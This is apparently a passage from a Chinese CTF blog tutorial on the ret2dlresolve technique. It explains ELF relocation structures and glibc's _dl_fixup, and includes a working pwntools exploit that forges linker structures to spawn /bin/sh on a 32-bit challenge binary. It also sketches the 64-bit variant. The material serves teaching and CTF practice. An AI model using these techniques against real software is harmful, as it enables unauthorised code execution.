<h3 id="Rel"><a href="#Rel" class="headerlink" title="Rel"></a>Rel</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Relocation table entry without addend (in section of type SHT_REL).  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* I have seen two different definitions of the Elf64_Rel and</span></span><br><span class="line"><span class="comment">   Elf64_Rela structures, so we&#x27;ll leave them out until Novell (or</span></span><br><span class="line"><span class="comment">   whoever) gets their act together.  */</span></span><br><span class="line"><span class="comment">/* The following, at least, is used on Sparc v9, MIPS, and Alpha.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf64_Rel;</span><br></pre></td></tr></table></figure></div>

<p>Rel 结构体用于描述重定位（Relocation）信息，其成员含义如下：</p>
<ul>
<li><code>r_offset</code>：加上<strong>传入的参数</strong> <code>link_map-&gt;l_addr</code> 等于该函数对应 got 表地址。</li>
<li><code>r_info</code> ：符号索引的低 8 位（32 位 ELF）或低 32 位（64 位 ELF）指示符号的类型这里设为 7 即可，高 24 位（32 位 ELF）或高 32 位（64 位 ELF）指示符号的索引即 <code>Sym</code> 构造的数组中的索引。</li>
</ul>
<h3 id="link-map"><a href="#link-map" class="headerlink" title="link_map"></a>link_map</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    ElfW(Addr) l_addr;		<span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">           file and the addresses in memory.  */</span></span><br><span class="line">    ...</span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">          + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><code>link_map</code> 是存储目标函数查询结果的一个结构体，我们主要关心 <code>l_addr</code> 和 <code>l_info</code> 两个成员即可。</p>
<ul>
<li><code>l_addr</code>：目标函数所在 lib 的基址。</li>
<li><code>l_info</code>：<code>Dyn</code> 结构体指针，指向各种结构对应的 <code>Dyn</code> 。<ul>
<li><code>l_info[DT_STRTAB]</code>：即 <code>l_info</code> 数组第 5 项，指向 <code>.dynstr</code> 对应的 <code>Dyn</code> 。</li>
<li><code>l_info[DT_SYMTAB]</code>：即 <code>l_info</code> 数组第 6 项，指向 <code>Sym</code> 对应的 <code>Dyn</code> 。</li>
<li><code>l_info[DT_JMPREL]</code>：即 <code>l_info</code> 数组第 23 项，指向 <code>Rel</code> 对应的 <code>Dyn</code> 。</li>
</ul>
</li>
</ul>
<h2 id="dl-runtime-resolve-函数"><a href="#dl-runtime-resolve-函数" class="headerlink" title="_dl_runtime_resolve 函数"></a>_dl_runtime_resolve 函数</h2><p><code> _dl_runtime_resolve</code> 函数的作用可以见前面 ret2libc 中 linux 延迟绑定机制的原理介绍图。这里详细介绍的是该函数的具体实现。</p>
<p>其中 <code>_dl_runtime_resolve</code> 的核心函数位 <code>_dl_fixup</code> 函数，这里是为了避免 <code>_dl_fixup</code> 传参与目标函数传参干扰（<code>_dl_runtime_resolve</code> 函数通过栈传参然后转换成 <code>_dl_fixup</code> 的寄存器传参）以及调用目标函数才在 <code>_dl_fixup</code> 外面封装一个 <code>_dl_runtime_resolve</code> 函数。<code>_dl_fixup</code> 函数的定义如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup(truct link_map *l, ElfW(Word) reloc_arg) &#123;</span><br><span class="line">    <span class="comment">// 获取符号表地址</span></span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">    <span class="comment">// 获取字符串表地址</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line">    <span class="comment">// 获取函数对应的重定位表结构地址，sizeof (PLTREL) 即 Elf*_Rel 的大小。</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> reloc_offset reloc_arg * sizeof (PLTREL)</span></span><br><span class="line">    <span class="type">const</span> PLTREL *<span class="type">const</span> reloc = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    <span class="comment">// 获取函数对应的符号表结构地址</span></span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    <span class="comment">// 得到函数对应的got地址，即真实函数地址要填回的地址</span></span><br><span class="line">    <span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *) (l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">    <span class="type">lookup_t</span> result;</span><br><span class="line">    DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断重定位表的类型，必须要为 ELF_MACHINE_JMP_SLOT(7)</span></span><br><span class="line">    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">       used don&#x27;t look in the global scope.  */</span></span><br><span class="line">    <span class="comment">// ☆ 关键判断，决定目标函数地址的查找方法。☆</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX(DT_VERSYM)]);</span><br><span class="line">            ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">            version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">            <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">                version = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment">       not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment">       we are not using any threads (yet).  */</span></span><br><span class="line">        <span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P) &#123;</span><br><span class="line">            THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">            flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">        RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="comment">// 查找目标函数地址</span></span><br><span class="line">        <span class="comment">// result 为 libc 的 link_map ，其中有 libc 的基地址。</span></span><br><span class="line">        <span class="comment">// sym 指针指向 libc 中目标函数对应的符号表，其中有目标函数在 libc 中的偏移。</span></span><br><span class="line">        result = _dl_lookup_symbol_x(strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">                                     version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">            THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">        RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment">       of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment">       offset.  */</span></span><br><span class="line">        <span class="comment">// 基址 + 偏移算出目标函数地址 value</span></span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS(result) + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment">       address) is also known.  */</span></span><br><span class="line">        <span class="comment">// 这里认为 link_map 和 sym 中已经是目标函数的信息了，因此直接计算目标函数地址。</span></span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span><br><span class="line">        result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">    value = elf_machine_plt_value(l, reloc, value);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">        &amp;&amp; __builtin_expect(ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">        value = elf_ifunc_invoke(DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    <span class="comment">// 更新 got 表</span></span><br><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt(l, result, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>需要注意的是 <code>_dl_fixup</code> 中会有如下判断，根据这个判断决定了重定位的策略。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>

<p><code>_dl_fixup</code> 函数在计算出目标函数地址并更新 got 表之后会回到 <code>_dl_runtime_resolve</code> 函数，之后 <code>_dl_runtime_resolve</code> 函数会<strong>调用目标函数</strong>。</p>
<h2 id="32-位-ret2dlresolve"><a href="#32-位-ret2dlresolve" class="headerlink" title="32 位 ret2dlresolve"></a>32 位 ret2dlresolve</h2><p>在 32 位下我们可以利用 <code>ELFW(ST_VISIBILITY) (sym-&gt;st_other)</code> 为 0 时的执行流程进行控制流劫持，因为这个执行流程会自动计算目标函数的地址，<strong>不需要知道 libc 具体版本</strong>，适用性更强。</p>
<p>其中 <code>ELFW(ST_VISIBILITY) (sym-&gt;st_other)</code> 为 0 时 <code>_dl_runtime_resolve</code> 函数的具体执行流程为：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/52d2f9340bd5f998d2887f40be788f3e.png"
                      style="zoom: 33%;" 
                ></p>
<ul>
<li>用 <code>link_map</code> 访问 <code>.dynamic</code> ，取出 <code>.dynstr</code> ， <code>.dynsym</code> ， <code>.rel.plt</code> 的指针。</li>
<li><code>.rel.plt + 第二个参数</code> 求出当前函数的重定位表项 <code>Elf32_Rel</code> 的指针，记作 <code>rel</code> 。</li>
<li><code>rel-&gt;r_info &gt;&gt; 8</code> 作为 <code>.dynsym</code> 的下标，求出当前函数的符号表项 <code>Elf32_Sym</code> 的指针，记作 <code>sym</code> 。</li>
<li><code>.dynstr + sym-&gt;st_name</code> 得出符号名字符串指针。</li>
<li>在动态链接库查找这个函数的地址，并且把地址赋值给 <code>*rel-&gt;r_offset</code> ，即 GOT 表。</li>
<li>调用这个函数。</li>
</ul>
<h3 id="改写-dynamic-的-DT-STRTAB"><a href="#改写-dynamic-的-DT-STRTAB" class="headerlink" title="改写 .dynamic 的 DT_STRTAB"></a>改写 .dynamic 的 DT_STRTAB</h3><p>这个只有在 checksec 时 <code>NO RELRO</code> 可行，即 <code>.dynamic</code> 可写。因为 <code>ret2dl-resolve</code> 会从 <code>.dynamic</code> 里面拿 <code>.dynstr</code> 字符串表的指针，然后加上 offset 取得函数名并且在动态链接库中搜索这个函数名，然后调用。而假如说我们能够改写这个指针到一块我们能够操纵的内存空间，当 resolve 的时候，就能 resolve 成我们所指定的任意库函数。</p>
<h3 id="操纵第二个参数，使其指向我们所构造的-Elf32-Rel"><a href="#操纵第二个参数，使其指向我们所构造的-Elf32-Rel" class="headerlink" title="操纵第二个参数，使其指向我们所构造的 Elf32_Rel"></a>操纵第二个参数，使其指向我们所构造的 Elf32_Rel</h3><p>由于 <code>_dl_runtime_resolve</code> 函数各种按下标取值的操作都没有进行越界检查，因此如果 <code>.dynamic</code> 不可写就操纵 <code>_dl_runtime_resolve</code> 函数的第二个参数，使其访问到可控的内存，然后在该内存中伪造 <code>.rel.plt</code> ，进一步可以伪造 <code>.dynsym</code> 和 <code>.dynstr</code> ，最终调用目标函数。</p>
<p>这里以 MidnightSunCTF2022 的 <a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/2022MidnightSunCTF_speed5" >speed5<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 为例讲解具体利用过程：</p>
<p>可以看出，程序主体部分是一个非常简单的栈溢出。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">go</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">48u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于溢出长度有限，因此首先需要栈迁移到其他地址处。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/d9b4d1426691a6b5f2d36eab1f459760.png"
                      style="zoom:33%;" 
                ></p>
<p>为了调用 <code>_dl_runtime_resolve</code> 函数，可以把接下来 rop 中的返回地址设为该函数的 plt 表地址。该地址对应的汇编指令如下：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux%20%E6%A0%88%E6%BA%A2%E5%87%BA/images/e67b342e7833f0cba6904e7f65910901.png"
                     
                ><br>可以看出 <code>_dl_runtime_resolve(link_map_obj, reloc_offset)</code> 的参数1 <code>link_map_obj</code> 被 push 到栈中，在此之前，栈顶一定是参数2 <code>reloc_arg</code> 。因此构造的 rop 中接下来的值是伪造的参数2。接下来rop链的内容是目标函数的返回地址和参数（具体rop链为什么这么构造可以看前面 ret2libc 中 linux 延迟绑定机制的原理介绍图）。</p>
<p>之后就是伪造那 3 个结构，具体见下图。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux%20%E6%A0%88%E6%BA%A2%E5%87%BA/images/6dafe13803caaf398e55613189c6bda3.png"
                     
                ><br><strong>注意：如果 patchelf 修改了 ELF 文件，那么这些表的偏移会发生改变。</strong></p>
<p>exp 如下：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./speed5&quot;</span>)</span><br><span class="line">context(arch=elf.arch, os=elf.os)</span><br><span class="line">p = process([elf.path])</span><br><span class="line"></span><br><span class="line">rop_addr = elf.bss() + <span class="number">0x700</span>  <span class="comment"># adjust according the stack when call the _dl_runtime_resolve</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret2dlresolve</span>():</span><br><span class="line">    func_name = <span class="string">&quot;system&quot;</span></span><br><span class="line">    func_args = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">    resolve_plt = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header[<span class="string">&#x27;sh_addr&#x27;</span>]</span><br><span class="line">    JMPREL = elf.dynamic_value_by_tag(<span class="string">&#x27;DT_JMPREL&#x27;</span>)</span><br><span class="line">    SYMTAB = elf.dynamic_value_by_tag(<span class="string">&#x27;DT_SYMTAB&#x27;</span>)</span><br><span class="line">    STRTAB = elf.dynamic_value_by_tag(<span class="string">&#x27;DT_STRTAB&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    fake_rel_addr = rop_addr + <span class="number">5</span> * <span class="number">4</span></span><br><span class="line">    reloc_offset = fake_rel_addr - JMPREL</span><br><span class="line">    fake_sym_addr = rop_addr + <span class="number">7</span> * <span class="number">4</span></span><br><span class="line">    align = (<span class="number">0x10</span> - ((fake_sym_addr - SYMTAB) &amp; <span class="number">0xF</span>)) &amp; <span class="number">0xF</span></span><br><span class="line">    fake_sym_addr += align</span><br><span class="line">    r_info = ((fake_sym_addr - SYMTAB) / <span class="number">0x10</span> &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span>  <span class="comment"># 0x7 means that Assertion `ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT&#x27;</span></span><br><span class="line">    fake_rel = p32(elf.bss() + <span class="number">0x10</span>) + p32(r_info)</span><br><span class="line">    fake_name_addr = fake_sym_addr + <span class="number">4</span> * <span class="number">4</span></span><br><span class="line">    st_name = fake_name_addr - STRTAB</span><br><span class="line">    fake_sym = p32(st_name) + p32(<span class="number">0</span>) * <span class="number">2</span> + p8(<span class="number">0x12</span>) + p8(<span class="number">0</span>) + p16(<span class="number">0</span>)</span><br><span class="line">    bin_sh_offset = (fake_sym_addr + <span class="number">0x10</span> - rop_addr + <span class="built_in">len</span>(func_name) + <span class="number">3</span>) &amp; ~<span class="number">3</span></span><br><span class="line">    bin_sh_addr = rop_addr + bin_sh_offset</span><br><span class="line"></span><br><span class="line">    payload = p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(resolve_plt)</span><br><span class="line">    payload += p32(reloc_offset)</span><br><span class="line">    payload += p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(bin_sh_addr)</span><br><span class="line">    payload += fake_rel</span><br><span class="line">    payload += <span class="string">&#x27;\x00&#x27;</span> * align</span><br><span class="line">    payload += fake_sym</span><br><span class="line">    payload += func_name</span><br><span class="line">    payload = payload.ljust(bin_sh_offset, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += func_args + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">24</span></span><br><span class="line">    payload += p32(rop_addr)</span><br><span class="line">    payload += p32(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">    payload += p32(elf.search(asm(<span class="string">&#x27;leave;ret&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">    payload += p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(rop_addr)</span><br><span class="line">    payload += p32(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">    p.send(payload)</span><br><span class="line">    pause()</span><br><span class="line">    p.send(ret2dlresolve())</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="64-位-ret2dlresolve"><a href="#64-位-ret2dlresolve" class="headerlink" title="64 位 ret2dlresolve"></a>64 位 ret2dlresolve</h2><p>64 位下伪造时（<code>.bss</code> 段离 <code>.dynsym</code> 太远） <code>reloc-&gt;r_info</code> 也很大，最后使得访问 <code>ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;</code> 时程序访存出错，导致程序崩溃。因此我们退而求其次选择 <code>ELFW(ST_VISIBILITY) (sym-&gt;st_other)</code> 不为 0 时时的程序执行流程，此时计算的目标函数地址为 <code>l-&gt;l_addr + sym-&gt;st_value</code> 。</p>
<p>虽然这种方法无法在不知道 libc 版本的情况下完成利用，但是可以在不泄露 libc 基址的情况下完成利用。</p>
<p>为了实现 64 位的 ret2dlresolve ，我们需要作如下构造：</p>
<ul>
<li><p><code>resolve</code> 函数传入的第二个参数为 0 ，从而从 <code>Elf64_Rel</code> 数组中找到第一个 <code>Elf64_Rel</code> 。</p>
</li>
<li><p>为了避免更新 got 表时内存访问错误，<code>Elf64_Rel</code> 的 <code>r_offset</code> 加上 <code>link_map-&gt;l_addr</code> 需要指向可读写内存。</p>
</li>
<li><p><code>Elf64_Rel</code> 的 <code>r_info</code> 的低 32 比特设置为 <code>ELF_MACHINE_JMP_SLOT</code> 即 7 。</p>
</li>
<li><p>为了避免下面这行代码访存错误，需要让 <code>l_info[5]</code> 指向可读写内存。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>Elf64_Rel</code> 的 <code>r_info</code> 的高 32 比特设置为 0 这样找的就是 <code>Elf64_Sym</code> 数组中的第一个 <code>Elf64_Sym</code> 。</p>
</li>
<li><p><code>link_map-&gt;l_info[6]-&gt;d_un.dptr</code> 指向 <code>puts@got - 8</code> 这样就伪造出 <code>Elf64_Sym</code> 的 <code>st_value</code> 为 <code>puts</code> 函数地址，同时 <code>st_order</code> 也大概率为非 0 。</p>
</li>
<li><p><code>link_map</code> 的 <code>l_addr</code> 设置为 <code>&amp;system - &amp;puts</code> ，这样 <code>l-&gt;l_addr + sym-&gt;st_value</code> 结果就是 <code>system</code> 函数地址。</p>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux%20%E6%A0%88%E6%BA%A2%E5%87%BA/images/9d2f83c616a5538a3a4ea6975318bc19.png"
                     
                ><br>例如 <a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/2021hgameweek3_without_leak/without_leak_b7bd5f2d0faebbc6ba6964bca265a506" >2021hgameweek3_without_leak<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 这道题目。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  close(<span class="number">2</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>栈溢出后面会关闭输出流，无法泄露 libc 地址，因此可以采用 ret2dlresolve 的方式实现任意命令执行。</p>
